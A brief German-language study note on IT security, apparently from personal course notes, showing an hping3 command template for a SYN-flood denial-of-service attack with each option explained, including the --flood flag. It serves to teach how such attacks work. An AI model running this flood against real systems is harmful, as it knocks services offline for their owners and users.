#Informatik #IT-Sicherheit 
### SYN-Flooding
``` bash
sudo hping3 <options> <Ziel-IP>
	-c <Paketzahl> # Anzahl der Pakete z.B. 15000
	-d <Paketgröße> # Paketgröße in Bytes z.B. 120
	-S # setzt das SYN-Flag (TCP)
	-p <Port> # Zielport
	-w <Fenstergröße> # Fenstergröße z.B. 64
	--flood # sendet Pakete so schnell wie möglich
```